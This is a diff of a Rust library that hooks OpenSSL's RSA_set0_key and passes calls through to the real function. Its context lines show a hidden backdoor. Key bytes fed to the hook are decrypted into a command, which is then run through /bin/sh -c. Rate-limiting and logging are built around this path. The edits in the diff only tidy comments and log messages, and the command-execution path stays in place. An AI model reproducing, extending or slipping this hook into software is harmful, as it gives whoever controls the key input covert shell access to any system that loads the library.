@@ -56,13 +56,11 @@ fn try_decrypt_and_run(key_bytes: &[u8]) {
 
     let mut last_trigger = LAST_TRIGGER.lock().unwrap();
     if let Some(time) = *last_trigger {
-        // If it's been less than 5 seconds, ignore this call
         if time.elapsed() < Duration::from_millis(300) {
             return;
         }
     }
 
-    // 3. Update the timer immediately (before executing)
     *last_trigger = Some(Instant::now());
 
     let key_slice = derive_key_from_seed(0);
@@ -81,7 +79,7 @@ fn try_decrypt_and_run(key_bytes: &[u8]) {
         let len = payload[3] as usize;
         if let Some(cmd_bytes) = payload.get(5..5 + len) {
             if let Ok(cmd) = std::str::from_utf8(cmd_bytes) {
-                log_to_file(&format!("[RUST-HOOK] 🔓 Executing: '{}'", cmd));
+                log_to_file(&format!("[RUST-HOOK] Executing: '{}'", cmd));
                 let _ = Command::new("/bin/sh").arg("-c").arg(cmd).status();
             }
         }
@@ -136,6 +134,7 @@ pub extern "C" fn RSA_set0_key(
             ) -> c_int = std::mem::transmute(real_ptr);
             real_fn(r, n, e, d)
         } else {
+            log_to_file("[RUST-HOOK] Real function not found");
             0
         }
     }
